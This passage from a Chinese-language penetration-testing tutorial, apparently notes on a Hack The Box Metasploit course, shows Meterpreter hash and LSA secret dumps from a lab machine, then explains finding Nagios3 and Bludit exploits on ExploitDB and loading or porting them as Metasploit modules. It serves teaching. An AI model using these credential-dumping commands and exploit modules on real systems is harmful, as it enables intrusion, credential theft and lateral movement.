11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line">Local SID : S-1-5-21-1709780765-3897210020-3926566182</span><br><span class="line"></span><br><span class="line">SAMKey : 37ceb48682ea1b0197c7ab294ec405fe</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf</span><br><span class="line">  Hash NTLM: d6908f022af0373e9e21b8a241c86dca</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : SUPPORT_388945a0</span><br><span class="line">  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6</span><br><span class="line"></span><br><span class="line">RID  : 000003eb (1003)</span><br><span class="line">User : IUSR_GRANPA</span><br><span class="line">  Hash LM  : a274b4532c9ca5cdf684351fab962e86</span><br><span class="line">  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88</span><br><span class="line"></span><br><span class="line">RID  : 000003ec (1004)</span><br><span class="line">User : IWAM_GRANPA</span><br><span class="line">  Hash LM  : 95d112c4da2348b599183ac6b1d67840</span><br><span class="line">  Hash NTLM: a97f39734c21b3f6155ded7821d04d16</span><br><span class="line"></span><br><span class="line">RID  : 000003ef (1007)</span><br><span class="line">User : ASPNET</span><br><span class="line">  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b</span><br><span class="line">  Hash NTLM: edc0d5506804653f58964a2376bbd769</span><br><span class="line"></span><br><span class="line">RID  : 000003f1 (1009)</span><br><span class="line">User : Lakis</span><br><span class="line">  Hash LM  : f927b0679b3cc0e192410d9b0b40873c</span><br><span class="line">  Hash NTLM: 3064b6fc432033870c6730228af7867c</span><br></pre></td></tr></table></figure><h4 id="MSF-Meterpreter-LSA-秘密转储"><a href="#MSF-Meterpreter-LSA-秘密转储" class="headerlink" title="MSF - Meterpreter LSA 秘密转储"></a>MSF - Meterpreter LSA 秘密转储</h4><p> MSF - Meterpreter LSA 秘密转储</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lsa_dump_secrets</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping LSA secrets</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line"></span><br><span class="line">Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )</span><br><span class="line">Domain name : HTB</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.7</span><br><span class="line">LSA Key : ada60ee248094ce782807afae1711b2c</span><br><span class="line"></span><br><span class="line">Secret  : aspnet_WP_PASSWORD</span><br><span class="line">cur/text: Q5C&#x27;181g16D&#x27;=F</span><br><span class="line"></span><br><span class="line">Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV</span><br><span class="line">cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 </span><br><span class="line"></span><br><span class="line">Secret  : DPAPI_SYSTEM</span><br><span class="line">cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 </span><br><span class="line">    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line">    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line"></span><br><span class="line">Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75</span><br><span class="line">cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line"></span><br><span class="line">Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588</span><br><span class="line">cur/hex : 00 f2 d1 31 e2 11 d3 01 </span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;</span><br><span class="line">cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f </span><br><span class="line">old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 </span><br><span class="line"></span><br><span class="line">Secret  : NL$KM</span><br><span class="line">cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f </span><br><span class="line"></span><br><span class="line">Secret  : SAC</span><br><span class="line"></span><br><span class="line">Secret  : SAI</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Alerter / service &#x27;Alerter&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_ALG / service &#x27;ALG&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_aspnet_state / service &#x27;aspnet_state&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dhcp / service &#x27;Dhcp&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dnscache / service &#x27;Dnscache&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LicenseService / service &#x27;LicenseService&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LmHosts / service &#x27;LmHosts&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_MSDTC / service &#x27;MSDTC&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcLocator / service &#x27;RpcLocator&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcSs / service &#x27;RpcSs&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_stisvc / service &#x27;stisvc&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_TlntSvr / service &#x27;TlntSvr&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_WebClient / service &#x27;WebClient&#x27; with username : NT AUTHORITY\LocalService</span><br></pre></td></tr></table></figure><p>从这一点来看，如果机器连接到更广泛的网络，我们可以使用这个战利品在系统中旋转，获得对内部资源的访问权限，并在网络的整体安全态势薄弱的情况下冒充具有更高访问权限的用户.</p><h2 id="编写和导入模块"><a href="#编写和导入模块" class="headerlink" title="编写和导入模块"></a>编写和导入模块</h2><p>要安装任何已经被其他用户移植过来的新 Metasploit 模块，可以选择<code>msfconsole</code>从终端更新它们，这将确保所有最新的漏洞、辅助工具和功能都将安装在最新版本的<code>msfconsole</code>. 只要移植的模块被推送到 GitHub 上的主要 Metasploit-framework 分支，我们就应该更新到最新的模块。</p><p>但是，如果我们只需要一个特定的模块并且不想执行完整升级，我们可以下载该模块并手动安装。我们将专注于在 ExploitDB 中搜索现成可用的 Metasploit 模块，我们可以将这些模块直接导入到我们的<code>msfconsole</code>本地版本中。</p><p>在搜索自定义漏洞时，<a href="https://www.exploit-db.com/">ExploitDB是一个不错的选择。</a>我们可以使用标签来搜索每个可用脚本的不同利用场景。这些标签之一是<a href="https://www.exploit-db.com/?tag=3">Metasploit Framework (MSF)</a>，如果选中，将仅显示 Metasploit 模块格式中也可用的脚本。这些可以直接从 ExploitDB 下载并安装在我们本地的 Metasploit Framework 目录中，从那里可以在<code>msfconsole</code>.</p><p><img src="/img/METASPLOIT3.png"></p><p>假设我们想使用为 找到的漏洞利用程序<code>Nagios3</code>，它将利用命令注入漏洞。我们正在寻找的模块是<code>Nagios3 - &#39;statuswml.cgi&#39; Command Injection (Metasploit)</code>. 所以我们启动<code>msfconsole</code>并尝试搜索那个特定的漏洞利用，但我们找不到它。这意味着我们的 Metasploit 框架不是最新的，或者<code>Nagios3</code>我们正在寻找的特定漏洞利用模块不在 Metasploit 框架的官方更新版本中。</p><h4 id="MSF-搜索漏洞"><a href="#MSF-搜索漏洞" class="headerlink" title="MSF - 搜索漏洞"></a>MSF - 搜索漏洞</h4><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search nagios</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution</span><br><span class="line">   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution</span><br><span class="line">   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution</span><br><span class="line">   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution</span><br><span class="line">   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection</span><br><span class="line">   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration</span><br></pre></td></tr></table></figure><p>但是，我们可以<a href="https://www.exploit-db.com/exploits/9861">在 ExploitDB 的条目中</a>找到漏洞利用代码。或者，如果我们不想使用我们的网络浏览器在 ExploitDB 中搜索特定的漏洞，我们可以使用 CLI 版本，<code>searchsploit</code>.</p><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit nagios3</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Remote Command Execution                                                                                             | multiple/remote/24084.py</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>请注意，以 结尾的托管文件终止符<code>.rb</code>是 Ruby 脚本，很可能是专门为在<code>msfconsole</code>. 我们还可以仅按<code>.rb</code>文件终止符进行过滤，以避免无法在<code>msfconsole</code>. 请注意，并非所有<code>.rb</code>文件都会自动转换为<code>msfconsole</code>模块。有些漏洞是用 Ruby 编写的，其中没有任何与 Metasploit 模块兼容的代码。我们将在以下小节中查看这些示例之一。</p><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit -t Nagios3 --exclude=&quot;.py&quot;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>我们必须下载<code>.rb</code>文件并将其放在正确的目录中。存储所有模块、脚本、插件和<code>msfconsole</code>专有文件的默认目录是<code>/usr/share/metasploit-framework</code>. 关键文件夹也在隐藏位置的主文件夹和根文件夹中进行了符号链接<code>~/.msf4/</code>。</p><h4 id="MSF-目录结构"><a href="#MSF-目录结构" class="headerlink" title="MSF - 目录结构"></a>MSF - 目录结构</h4><p> MSF - 目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/</span><br><span class="line"></span><br><span class="line">app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor</span><br><span class="line">config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts</span><br><span class="line">data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools</span><br></pre></td></tr></table></figure><p> MSF - 目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls .msf4/</span><br><span class="line"></span><br><span class="line">history  local  logos  logs  loot  modules  plugins  store</span><br></pre></td></tr></table></figure><p><a href="https://www.exploit-db.com/exploits/9861">我们下载好exploit</a>后拷贝到合适的目录下。请注意，我们的主文件夹<code>.msf4</code>位置可能不具有该文件夹可能具有的所有文件夹结构<code>/usr/share/metasploit-framework/</code>。因此，我们只需要<code>mkdir</code>适当的文件夹，使结构与原始文件夹相同，以便<code>msfconsole</code>可以找到新模块。之后，我们将继续将<code>.rb</code>脚本直接复制到主要位置。</p><p>请注意，某些命名约定如果没有得到充分遵守，将在尝试识别<code>msfconsole</code>我们安装的新模块时产生错误。始终使用蛇形、字母数字字符和下划线而不是破折号。</p><p>例如：</p><ul><li><code>nagios3_command_injection.rb</code></li><li><code>our_module_here.rb</code></li></ul><h4 id="MSF-在运行时加载附加模块"><a href="#MSF-在运行时加载附加模块" class="headerlink" title="MSF - 在运行时加载附加模块"></a>MSF - 在运行时加载附加模块</h4><p> MSF - 在运行时加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure><h4 id="MSF-加载附加模块"><a href="#MSF-加载附加模块" class="headerlink" title="MSF - 加载附加模块"></a>MSF - 加载附加模块</h4><p> MSF - 加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; loadpath /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure><p>或者，我们也可以启动<code>msfconsole</code>并运行<code>reload_all</code>新安装的模块出现在列表中的命令。命令运行完没有报错后，要么试试<code>search [name]</code>里面的函数<code>msfconsole</code>，要么直接用<code>use [module-path]</code>直接跳转到新安装的模块。</p><p> MSF - 加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; reload_all</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/nagios3_command_injection </span><br><span class="line">msf6 exploit(unix/webapp/nagios3_command_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/nagios3_command_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting                 Required  Description</span><br><span class="line">   ----     ---------------                 --------  -----------</span><br><span class="line">   PASS     guest                           yes       The password to authenticate with</span><br><span class="line">   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80                              yes       The target port (TCP)</span><br><span class="line">   SSL      false                           no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi</span><br><span class="line">   USER     guest                           yes       The username to authenticate with</span><br><span class="line">   VHOST                                    no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br></pre></td></tr></table></figure><p>现在我们已准备好针对我们的目标启动它。</p><hr><h2 id="将脚本移植到-Metasploit-模块中"><a href="#将脚本移植到-Metasploit-模块中" class="headerlink" title="将脚本移植到 Metasploit 模块中"></a>将脚本移植到 Metasploit 模块中</h2><p>要将自定义 Python、PHP 或任何类型的漏洞利用脚本改编为 Metasploit 的 Ruby 模块，我们需要学习 Ruby 编程语言。请注意，Metasploit 的 Ruby 模块始终使用硬选项卡编写。</p><p>当开始移植项目时，我们不需要从头开始编码。相反，我们可以从我们的项目所属的类别中获取现有的漏洞利用模块之一，并将其重新用于我们当前的移植脚本。请记住始终保持我们的自定义模块井井有条，以便我们和其他渗透测试人员在搜索自定义模块时可以从干净、井井有条的环境中受益。</p><p>我们首先选择一些漏洞利用代码移植到 Metasploit。在此示例中，我们将使用<a href="https://www.exploit-db.com/exploits/48746">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</a>。我们需要下载脚本，<code>48746.rb</code>然后将其复制到<code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code>文件夹中。如果我们现在启动<code>msfconsole</code>，我们将只能在与上面相同的文件夹中找到一个<code>Bludit CMS</code>漏洞，确认我们的漏洞还没有被移植过来。好消息是该文件夹中已经有一个 Bludit 漏洞，因为我们将把它用作我们新漏洞的样板代码。</p><h4 id="移植-MSF-模块"><a href="#移植-MSF-模块" class="headerlink" title="移植 MSF 模块"></a>移植 MSF 模块</h4><p> 移植 MSF 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit</span><br><span class="line"></span><br><span class="line">bludit_upload_images_exec.rb</span><br></pre></td></tr></table></figure><p> 移植 MSF 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb</span><br></pre></td></tr></table></figure><p>在我们复制的文件的开头，也就是我们要填写信息的地方，我们可以注意到<code>include</code>样板模块开头的语句。这些是本节中提到的混合宏<code>Plugins and Mixins</code>，我们需要将它们更改为适合我们模块的混合宏。</p><p><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">如果我们想找到我们的模块工作所需的合适的 mixins、类和方法，我们将需要在rubydoc rapid7 文档</a>中查找不同的条目。</p><hr><h2 id="编写我们的模块"><a href="#编写我们的模块" class="headerlink" title="编写我们的模块"></a>编写我们的模块</h2><p>在特定评估期间，我们经常会面对运行专有代码以服务其客户的定制网络。我们手头的大多数模块甚至都没有在它们的周边留下凹痕，而且我们似乎无法用我们拥有的任何东西正确地扫描和记录目标。在这里，我们可能会发现重拾 Ruby 技能并开始编写模块代码很有帮助。</p><p><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework">有关 Metasploit Ruby 编码的所有必要信息都可以在Rubydoc.info Metasploit Framework</a>相关页面上找到。从扫描器到其他辅助工具，从定制的漏洞利用程序到移植的漏洞利用程序，用 Ruby 为框架编写代码是一项非常实用的技能。</p><p>请看下面一个类似的模块，我们可以将其用作漏洞利用移植的样板代码。这是<a href="https://www.exploit-db.com/exploits/47699">Bludit 目录遍历图像文件上传漏洞</a>利用，已经导入到<code>msfconsole</code>. 在漏洞利用概念验证 ( ) 之前，花点时间了解模块中包含的所有不同字段<code>POC</code>。请注意，此代码在下面的代码片段中没有更改以适应我们当前的导入，而是上面提到的预先存在的模块的直接快照。这些信息将需要针对新的移植项目进行相应调整。</p><h4 id="概念验证-要求"><a href="#概念验证-要求" class="headerlink" title="概念验证 - 要求"></a>概念验证 - 要求</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::FileDropper</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br></pre></td></tr></table></figure><p>我们可以查看<code>include</code>语句以了解每个语句的作用。<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">这可以通过将它们与rubydoc rapid7 文档</a>交叉引用来完成。以下是文档中解释的它们各自的功能：</p><table><thead><tr><th><strong>功能</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Msf::Exploit::Remote::HttpClient</code></td><td>该模块提供了在利用 HTTP 服务器时充当 HTTP 客户端的方法。</td></tr><tr><td><code>Msf::Exploit::PhpEXE</code></td><td>这是一种用于生成第一阶段 php 负载的方法。</td></tr><tr><td><code>Msf::Exploit::FileDropper</code></td><td>此方法在与目标建立会话后传输文件并处理文件清理。</td></tr><tr><td><code>Msf::Auxiliary::Report</code></td><td>此模块提供向 MSF DB 报告数据的方法。</td></tr></tbody></table><p>看看他们上面的目的，我们得出结论，我们不需要 FileDropper 